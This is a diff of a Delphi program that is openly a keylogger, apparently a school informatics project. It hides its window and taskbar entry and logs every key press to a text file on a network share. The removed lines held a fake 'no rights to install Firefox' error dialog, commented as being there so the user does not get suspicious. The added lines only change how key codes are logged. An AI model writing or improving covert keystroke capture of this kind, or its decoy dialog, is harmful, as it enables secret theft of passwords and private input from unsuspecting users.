@@ -48,22 +48,14 @@ end;
 
 procedure TForm1.FormCreate(Sender: TObject); //Writes Lines to .txt
 var f:textfile;
-  today: TDateTime;
-  nowrandstring: String;
-  errorMessage: Integer;
 begin
-today := Now;
-randomize();
-nowrandstring := DateToStr(today) + '_' + inttostr(random(1000000));
-d:= 'S:\Informatik EF 2015\lökj\' +  nowrandstring + '.txt';
+d:= 'S:\Informatik EF 2015\lökj\' +  datetostr(now) + '.txt';
 assignfile(f,d);
 rewrite(f);
 writeln(f, 'KeyloggerProtocol - EF Info');
 closefile(f);
 Application.ShowMainForm := False;   //Hides Form
 Application.MainFormOnTaskbar := false; //Hides Label on the bottom taskbar
-// Show error message so user does not get suspicious
-  errorMessage := MessageDlg('Sie besitzen nicht die nötigen Zugriffsrechte, um Firefox zu installieren.', mtError, [mbOK], 0);
 end;
 
 procedure TForm1.Timer1Timer(Sender: TObject); //Main Procedure based of an interval
@@ -85,7 +77,7 @@ begin
     8: DisplayAction(' [BACKSPACE] ');
     9: DisplayAction(' [TAB] ');
     12: DisplayAction(' [ALT] ');
-    13: Memo1.Lines.Add('');
+    13: DisplayAction(' [ENTER] ');
     16: Pressed := True;  //DisplayAction(' [SHIFT] ');
     17: DisplayAction(' [CONTROL] ');
     18: DisplayAction(' [ALT] ');
@@ -156,8 +148,9 @@ begin
     226: DisplayAction(' < ');
   else if (InputKey >=32) and (InputKey <=110) AND (InputKey <> 64) then
   begin
-    if pressed then Memo1.Text := Memo1.Text + Uppercase(Chr(InputKey))
-    else Memo1.Text := Memo1.Text + Lowercase(Chr(InputKey));
+    if pressed then Memo1.Text := Memo1.Text + Uppercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey)
+    else Memo1.Text := Memo1.Text + Lowercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey);
+    Memo1.Lines.Add('');
     Memo1.Lines.SaveToFile(d);
   end
   else // Exception for all undefined keys
